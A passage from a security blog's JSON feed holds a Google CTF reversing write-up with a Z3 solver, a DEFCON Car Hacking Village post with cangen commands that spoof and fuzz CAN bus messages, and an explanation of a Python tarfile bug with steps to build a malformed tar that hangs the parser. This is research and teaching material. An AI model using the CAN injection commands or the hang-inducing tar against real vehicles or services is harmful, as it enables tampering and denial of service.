0x00000000000010be &lt;+62&gt;:    pshufb xmm0,XMMWORD PTR [rip+0x2fa9]        # 0x4070 &lt;SHUFFLE&gt;\n   0x00000000000010c7 &lt;+71&gt;:    paddd  xmm0,XMMWORD PTR [rip+0x2f91]        # 0x4060 &lt;ADD32&gt;\n   0x00000000000010cf &lt;+79&gt;:    pxor   xmm0,XMMWORD PTR [rip+0x2f79]        # 0x4050 &lt;XOR&gt;\n   0x00000000000010d7 &lt;+87&gt;:    movaps XMMWORD PTR [rsp+0x10],xmm0\n   0x00000000000010dc &lt;+92&gt;:    call   0x1030 &lt;strncmp@plt&gt;\n   0x00000000000010e1 &lt;+97&gt;:    test   eax,eax\n   0x00000000000010e3 &lt;+99&gt;:    jne    0x1100 &lt;main+128&gt;\n   0x00000000000010e5 &lt;+101&gt;:   mov    rsi,QWORD PTR [rip+0x2f94]        # 0x4080 &lt;EXPECTED_PREFIX&gt;\n   0x00000000000010ec &lt;+108&gt;:   mov    edx,0x4\n   0x00000000000010f1 &lt;+113&gt;:   mov    rdi,rbp\n   0x00000000000010f4 &lt;+116&gt;:   call   0x1030 &lt;strncmp@plt&gt;\n   0x00000000000010f9 &lt;+121&gt;:   mov    r12d,eax\n   0x00000000000010fc &lt;+124&gt;:   test   eax,eax\n   0x00000000000010fe &lt;+126&gt;:   je     0x111d &lt;main+157&gt;\n   0x0000000000001100 &lt;+128&gt;:   lea    rdi,[rip+0xf11]        # 0x2018\n   0x0000000000001107 &lt;+135&gt;:   mov    r12d,0x1\n   0x000000000000110d &lt;+141&gt;:   call   0x1040 &lt;puts@plt&gt;\n   0x0000000000001112 &lt;+146&gt;:   add    rsp,0x28\n   0x0000000000001116 &lt;+150&gt;:   mov    eax,r12d\n   0x0000000000001119 &lt;+153&gt;:   pop    rbp\n   0x000000000000111a &lt;+154&gt;:   pop    r12\n   0x000000000000111c &lt;+156&gt;:   ret\n   0x000000000000111d &lt;+157&gt;:   lea    rdi,[rip+0xeec]        # 0x2010\n   0x0000000000001124 &lt;+164&gt;:   call   0x1040 &lt;puts@plt&gt;\n   0x0000000000001129 &lt;+169&gt;:   jmp    0x1112 &lt;main+146&gt;\nEnd of assembler dump.\n</code></pre>\n<p>The key part is:</p>\n<pre><code>   0x00000000000010be &lt;+62&gt;:    pshufb xmm0,XMMWORD PTR [rip+0x2fa9]        # 0x4070 &lt;SHUFFLE&gt;\n   0x00000000000010c7 &lt;+71&gt;:    paddd  xmm0,XMMWORD PTR [rip+0x2f91]        # 0x4060 &lt;ADD32&gt;\n   0x00000000000010cf &lt;+79&gt;:    pxor   xmm0,XMMWORD PTR [rip+0x2f79]        # 0x4050 &lt;XOR&gt;\n   0x00000000000010d7 &lt;+87&gt;:    movaps XMMWORD PTR [rsp+0x10],xmm0\n   0x00000000000010dc &lt;+92&gt;:    call   0x1030 &lt;strncmp@plt&gt;\n</code></pre>\n<p>The input (flag) is placed in a 128-bit register <code>xmm0</code> and 3 128-bit operations are performed:</p>\n<ol>\n<li>Shuffle register based on key in 0x4070 (not randomly)</li>\n<li>Add register and value in 0x4060 as 4 32-bit uints (carry bits don't propaagate between the 4 additions)</li>\n<li>XOR with value in 0x4050</li>\n</ol>\n<p>The result should equal the original input flag (<code>strncmp</code>).</p>\n<h2 id=\"solution-1\" tabindex=\"-1\">Solution <a class=\"header-anchor\" href=\"https://blog.caller.xyz/google-ctf-2020-writeup/\">#</a></h2>\n<p>The XOR, ADD32, SHUFFLE keys can be extracted easily. However, shuffle was a bit confusing, so I just experimented to see how input was transformed:</p>\n<pre><code># Set breakpoint just after shuffle\n&gt; break *main+71\n&gt; run\nFlag: abcdefghijklmnopqr\n&gt; p (char[]) $xmm0\n$1 = &quot;cghbfljod\\000eikmna&quot;\n</code></pre>\n<p>Next to find an input which remains the same at the end of the 3 transformations I used the SAT solver Z3 (<code>pip install z3-solver</code>).</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\"><span class=\"token keyword\">import</span> struct\n<span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span>\n\nshuffle_mask <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">11</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">14</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">15</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">]</span>\n\ns <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\noriginal <span class=\"token operator\">=</span> Ints<span class=\"token punctuation\">(</span><span class=\"token string\">'_a _b _c _d _e _f _g _h _i _j _k _l _m _n _o'</span><span class=\"token punctuation\">)</span>\n\nshuffled <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>original<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token keyword\">if</span> i <span class=\"token operator\">!=</span> <span class=\"token number\">15</span> <span class=\"token keyword\">else</span> IntVal<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> shuffle_mask<span class=\"token punctuation\">]</span>\n\nADD <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0xdeadbeef</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xfee1dead</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13371337</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x67637466</span><span class=\"token punctuation\">]</span>\n\n<span class=\"token comment\"># XOR = [0x49b45876, 0x385f1a8d, 0x34f823d4, 0xaaf986eb]</span>\nXOR <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">0x76</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x49</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x8d</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1a</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5f</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xd4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xeb</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x86</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xf9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xaa</span><span class=\"token punctuation\">]</span>\nXOR <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVecVal<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> a <span class=\"token keyword\">in</span> XOR<span class=\"token punctuation\">]</span>\n\n<span class=\"token comment\"># Add in 4 32-bit ints</span>\nmega_add <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    additive <span class=\"token operator\">+</span> <span class=\"token builtin\">sum</span><span class=\"token punctuation\">(</span>\n        x <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">*</span> j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> j <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token keyword\">else</span> x\n        <span class=\"token keyword\">for</span> j<span class=\"token punctuation\">,</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>shuffled<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> additive <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span>ADD<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">]</span>\n<span class=\"token comment\"># Split result back into 16 bytes</span>\nadded <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>\n    Int2BV<span class=\"token punctuation\">(</span>m <span class=\"token operator\">/</span> <span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token number\">8</span> <span class=\"token operator\">*</span> i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> i <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token keyword\">else</span> Int2BV<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> m <span class=\"token keyword\">in</span> mega_add\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">]</span>\n\nxored <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>added_var <span class=\"token operator\">^</span> xor <span class=\"token keyword\">for</span> added_var<span class=\"token punctuation\">,</span> xor <span class=\"token keyword\">in</span> <span class=\"token builtin\">zip</span><span class=\"token punctuation\">(</span>added<span class=\"token punctuation\">,</span> XOR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>\n\noutputs <span class=\"token operator\">=</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>xored<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">for</span> i<span class=\"token punctuation\">,</span> cribbed <span class=\"token keyword\">in</span> <span class=\"token builtin\">enumerate</span><span class=\"token punctuation\">(</span><span class=\"token string\">'CTF{*********!}'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> cribbed <span class=\"token operator\">!=</span> <span class=\"token string\">'*'</span><span class=\"token punctuation\">:</span>\n        s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>original<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>cribbed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>outputs<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>cribbed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>outputs<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> Int2BV<span class=\"token punctuation\">(</span>original<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>original<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">33</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># Guess alphabet range for flag</span>\n        s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>original<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">126</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"LETS GO\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nmodel <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>as_long<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> original<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>as_long<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> shuffled<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>as_long<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> added<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>as_long<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> xored<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>as_long<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> outputs<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>model<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>as_long<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> outputs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></code></pre>\n<p>Which after 1 minute prints out the flag <code>CTF{S1MDf0rM3!}</code>.</p>\n",
			"date_published": "2020-08-24T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/defconsm-car-hacking/",
			"url": "https://blog.caller.xyz/defconsm-car-hacking/",
			"title": "DEFCON:SM Car Hacking",
			"content_html": "<p>Had some fun with the <a href=\"https://www.carhackingvillage.com/\">Car Hacking Village</a> at this year's remote DEFCON Safe Mode. There seems to be a growing interest in automotive security which I've completely ignored until now, but decided to watch a beginner talk <a href=\"https://youtu.be/IBtZ0QGYGQc?t=11672\">Cluster Fuzz by @mintynet</a> about fuzzing the CAN bus.</p>\n<p>We had remote access to some cars (or parts of cars). Raspberry pis were connected to the CAN bus, allowing hackers to SSH in and send commands. The effect on the instrument panels could be seen via twitch.</p>\n<p>I suppose this wasn't exploiting anything, but it was fun to discover how the systems interprets and responds to CAN messages from sensors and controls.</p>\n<p>The tools used were:</p>\n<ul>\n<li>cansniffer to see the CAN bus traffic</li>\n<li>cansend to send a message</li>\n<li>cangen to fuzz</li>\n</ul>\n<p>A CAN message consists of a 11-bit ID and up to 8 bytes of data.</p>\n<p>The first step is to discover which IDs control what you're interested in. Then you can either make targetted changes or fuzz it.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/vNl_CwTw-A-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/vNl_CwTw-A-1200.webp 1200w\"><img alt=\"Vroom vroom\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/vNl_CwTw-A-1200.png\" width=\"1200\" height=\"378\"></picture><figcaption>Vroom vroom</figcaption></figure><p></p>\n<p>As an example with a Peugeot 208 we found ID=F6 can reset power, control odometer reading, and control engine temperature meter. When I spammed the same message <code>cangen can0 -g 0 -vvv -I f6 -L 8 -n 1000 -D 0800000032000000</code> the odometer displayed 80 km because 0x32 = 50 miles. If the 0x08 was set to 0x00 instead, the dashboard would reboot. The last 3 bytes were found to control the temperature meter. The IDs and data formats are different for different models of car.</p>\n<p>After discovering the ID which controls lots of stuff I used <code>cangen slcan0 -vvv -I $ID -g 5 -L8</code> which spammed random 8-byte messages to the bus. The result was chaos with the wash bottle squirting, relays going off and blinky lights. Anyway, was a bit of fun.</p>\n<p>‌</p><figure><picture><source type=\"image/avif\" srcset=\"https://blog.caller.xyz/img/YI6w-b7RUO-1200.avif 1200w\"><source type=\"image/webp\" srcset=\"https://blog.caller.xyz/img/YI6w-b7RUO-1200.webp 1200w\"><img alt=\"Blinky lights\" loading=\"lazy\" decoding=\"async\" src=\"https://blog.caller.xyz/img/YI6w-b7RUO-1200.png\" width=\"1200\" height=\"620\"></picture><figcaption>Blinky lights</figcaption></figure><p></p>\n",
			"date_published": "2020-08-08T00:00:00Z"
		}
		,
		{
			"id": "https://blog.caller.xyz/python-tarfile-infinite-loop-dos/",
			"url": "https://blog.caller.xyz/python-tarfile-infinite-loop-dos/",
			"title": "Python tarfile infinite loop DoS",
			"content_html": "<p>The python <code>tarfile</code> module can end up in an infinite loop when opening maliciously malformed tar files.\nI came across Denial of Service bug <a href=\"https://bugs.python.org/issue39017\">bpo39017</a> when browsing the python bug tracker for security issues (I didn't discover this bug myself). The error-reproducing zipfile the reporter uploaded is direct from the fuzzer, but I wanted to understand and isolate the issue by making the smallest tarfile which reproduces the bug.</p>\n<h2 id=\"tarfile-structure\" tabindex=\"-1\">Tarfile structure <a class=\"header-anchor\" href=\"https://blog.caller.xyz/python-tarfile-infinite-loop-dos/\">#</a></h2>\n<p>The name tar is derived from &quot;tape archive&quot; which harks back to its 1979 release to help store multiple files on magnetic tape.\nTar files are made up of blocks of 512 bytes.\nThere's no overall header or central directory: to list files you'll need to scan through the tarfile and read all the header records.\nAny header struct (257 bytes) or content will be padded to the block size, so most of a tarfile will be NULL bytes.\nThe header is a bit gross, having integer fields encoded as ASCII digits in octal.</p>\n<h3 id=\"serious-tarfile-vulnerabilities\" tabindex=\"-1\">Serious tarfile vulnerabilities <a class=\"header-anchor\" href=\"https://blog.caller.xyz/python-tarfile-infinite-loop-dos/\">#</a></h3>\n<p>The tarfile headers contain the archived filenames. If the filename is an absolute path, some tarfile implementations can be tricked into extracting files to arbitrary locations. Arbitrary write may also be possible when extracting symlinks. The same issues affect other archive formats. This post isn't about these vulnerabilities.</p>\n<h3 id=\"pax\" tabindex=\"-1\">PAX <a class=\"header-anchor\" href=\"https://blog.caller.xyz/python-tarfile-infinite-loop-dos/\">#</a></h3>\n<p>The bug is in python's <code>tarfile</code> module's processing of PAX header records. PAX is extensions for tar which add properties left out of the original tar header struct, or which don't fit within the fixed size fields defined in times gone by e.g. symlinks, arbitrary resolution timestamps, uids &gt; 2097151, file sizes &gt; 8GB, long filenames. If we want to specify PAX information for a file, we make a fake file with the <code>typeflag</code> in the header record set to <code>x</code> or <code>g</code>. The fake file's content is the extra PAX headers. The next block can contain the normal header record for the file, followed by blocks containing the file contents.</p>\n<p>You can try to make a PAX tarfile: (Without <code>--blocking-factor</code>, each block is some multiple of 512 bytes)</p>\n<pre class=\"language-bash\" tabindex=\"0\"><code class=\"language-bash\"><span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"myfilecontent\"</span> <span class=\"token operator\">></span> myfile\n<span class=\"token function\">tar</span> <span class=\"token parameter variable\">-cf</span> hello.tar <span class=\"token parameter variable\">--format</span><span class=\"token operator\">=</span>pax --blocking-factor<span class=\"token operator\">=</span><span class=\"token number\">1</span> myfile\nhexdump <span class=\"token parameter variable\">-C</span> hello.tar</code></pre>\n<pre class=\"language-hexdump\" tabindex=\"0\"><code class=\"language-hexdump\">00000000  2e 2f 50 61 78 48 65 61  64 65 72 73 2e 31 39 31  |./PaxHeaders.191| # Header for fake file\n00000010  37 37 2f 6d 79 66 69 6c  65 00 00 00 00 00 00 00  |77/myfile.......|\n00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000060  00 00 00 00 30 30 30 30  36 34 34 00 30 30 30 30  |....0000644.0000|\n00000070  30 30 30 00 30 30 30 30  30 30 30 00 30 30 30 30  |000.0000000.0000|\n00000080  30 30 30 30 30 36 31 00  30 37 30 33 33 32 34 31  |0000061.07033241|\n00000090  36 30 30 00 30 31 32 31  36 34 00 20 78 00 00 00  |600.012164. x...|\n000000a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000100  00 75 73 74 61 72 00 30  30 00 00 00 00 00 00 00  |.ustar.00.......|\n00000110  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000200  31 39 20 61 74 69 6d 65  3d 39 34 36 36 38 34 38  |19 atime=9466848| # PAX header records\n00000210  30 30 0a 33 30 20 63 74  69 6d 65 3d 31 35 39 34  |00.30 ctime=1594|\n00000220  33 34 30 33 32 30 2e 38  30 31 30 37 35 30 36 35  |340320.801075065|\n00000230  0a 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000240  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000400  6d 79 66 69 6c 65 00 00  00 00 00 00 00 00 00 00  |myfile..........| # File header\n00000410  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000460  00 00 00 00 30 30 30 30  36 34 34 00 30 30 30 31  |....0000644.0001|\n00000470  37 35 30 00 30 30 30 31  37 35 30 00 30 30 30 30  |750.0001750.0000|\n00000480  30 30 30 30 30 31 36 00  30 37 30 33 33 32 34 31  |0000016.07033241|\n00000490  36 30 30 00 30 31 31 36  35 30 00 20 30 00 00 00  |600.011650. 0...|\n000004a0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000500  00 75 73 74 61 72 00 30  30 62 65 6e 00 00 00 00  |.ustar.00ben....|\n00000510  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000520  00 00 00 00 00 00 00 00  00 62 65 6e 00 00 00 00  |.........ben....|\n00000530  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n00000540  00 00 00 00 00 00 00 00  00 30 30 30 30 30 30 30  |.........0000000|\n00000550  00 30 30 30 30 30 30 30  00 00 00 00 00 00 00 00  |.0000000........|\n00000560  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000600  6d 79 66 69 6c 65 63 6f  6e 74 65 6e 74 0a 00 00  |myfilecontent...| # File content\n00000610  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|\n*\n00000c00  # 2 completely NULL blocks added at end</code></pre>\n<p>Notice those <code>*</code> lines which are multiple lines of NULL bytes. 512 = 0x200, so blocks start at 0x0, 0x200, 0x400, 0x600, 0x800, 0xA00.</p>\n<h3 id=\"pax-headers-structure\" tabindex=\"-1\">PAX headers structure <a class=\"header-anchor\" href=\"https://blog.caller.xyz/python-tarfile-infinite-loop-dos/\">#</a></h3>\n<p>A PAX header record is a UTF-8 encoded string of the format: <code>&quot;%d %s=%s\\n&quot;, &lt;length&gt;, &lt;keyword&gt;, &lt;value&gt;</code></p>\n<p>Several of these records can be concatenated.</p>\n<p>The length is the length of the record, including the length field and the ending newline. The keyword cannot contain an equals sign. Standard keywords include 'path' &amp; 'atime'.</p>\n<h2 id=\"the-bug\" tabindex=\"-1\">The bug <a class=\"header-anchor\" href=\"https://blog.caller.xyz/python-tarfile-infinite-loop-dos/\">#</a></h2>\n<p>The <code>length</code> and <code>keyword</code> are extracted with a <a href=\"https://github.com/python/cpython/blob/b26a0db8ea2de3a8a8e4b40e69fc8642c7d7cb68/Lib/tarfile.py#L1243\">regex</a>. That's not the problem. The problem is that the length is not validated and we use the <code>length</code> variable to <a href=\"https://github.com/python/cpython/blob/b26a0db8ea2de3a8a8e4b40e69fc8642c7d7cb68/Lib/tarfile.py#L1245-L1271\">iterate</a>:</p>\n<pre class=\"language-python\" tabindex=\"0\"><code class=\"language-python\">regex <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span><span class=\"token builtin\">compile</span><span class=\"token punctuation\">(</span><span class=\"token string\">br\"(\\d+) ([^=]+)=\"</span><span class=\"token punctuation\">)</span>\npos <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">match</span> <span class=\"token operator\">=</span> regex<span class=\"token punctuation\">.</span><span class=\"token keyword\">match</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">,</span> pos<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token keyword\">match</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">break</span>\n\n    length<span class=\"token punctuation\">,</span> keyword <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span><span class=\"token punctuation\">.</span>groups<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n    pos <span class=\"token operator\">+=</span> length</code></pre>\n<p>If <code>length</code> is zero, e.g. if <code>buf</code> contains <code>&quot;0 X=&quot;</code>, we loop forever.</p>\n<h3 id=\"does-this-affect-other-languages\" tabindex=\"-1\">Does this affect other languages? <a class=\"header-anchor\" href=\"https://blog.caller.xyz/python-tarfile-infinite-loop-dos/\">#</a></h3>\n<p>In the rust crate <a href=\"https://github.com/alexcrichton/tar-rs/blob/master/src/pax.rs\">tar-rs</a>, the block is first split on newline characters. The length field is then checked against the actual length of the record. I didn't see any tarfile documentation that forbids newline characters within a keyword. This library would reject such a record, but that's almost definitely ok. Golang checks that the <a href=\"https://github.com/golang/go/blob/fae44a2be350940c3b29919e274e9a7e63f22df7/src/archive/tar/strconv.go#L264\">length is sensible</a> and then that the record <a href=\"https://github.com/golang/go/blob/fae44a2be350940c3b29919e274e9a7e63f22df7/src/archive/tar/strconv.go#L270\">ends in a newline</a>. Ruby and php seem ok.</p>\n<p>This is probably a python-only bug.</p>\n<h3 id=\"exploitation\" tabindex=\"-1\">Exploitation <a class=\"header-anchor\" href=\"https://blog.caller.xyz/python-tarfile-infinite-loop-dos/\">#</a></h3>\n<p>First we make a 512-byte header block specifying that the following block is PAX information (type is 'x' or 'g'). Then we append <code>&quot;0 X=&quot;</code> for a total of 516 bytes.</p>\n<p>Feed the output file into <code>tarfile.open()</code> or <code>tarfile.is_tarfile()</code> and wait a very long time. Or try 